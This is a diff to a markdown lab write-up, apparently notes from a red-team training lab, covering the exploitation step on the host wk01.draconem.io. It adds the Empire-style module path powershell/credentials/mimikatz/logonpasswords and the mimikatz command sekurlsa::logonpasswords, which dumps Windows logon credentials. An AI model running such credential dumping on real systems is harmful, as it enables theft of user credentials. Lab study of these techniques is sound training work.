@@ -25,14 +25,10 @@ Note: We cannot spawn a 64 bit PS from a 32 bit agent. To spawn a new process / 
 
 ![[Pasted image 20240331023805.png]]
 ## Exploitation 
-Interact with your new 64-bit agent, select powershell/credentials/mimikatz/logonpasswords from the Execute Module drop down list. Then click the SUBMIT button.
-```markdown
-```
+Interact with your new 64-bit agent, select `powershell/credentials/mimikatz/logonpasswords` from the Execute Module drop down list. Then click the SUBMIT button.
+- `mimikatz(powershell) # sekurlsa::logonpasswords`
 
 ![[Pasted image 20240331023854.png]]
-
-#### Notes | Bonus
-
 
 ## Conclusion
 In this lab we took advantage of our foothold on wk01.draconem.io. 
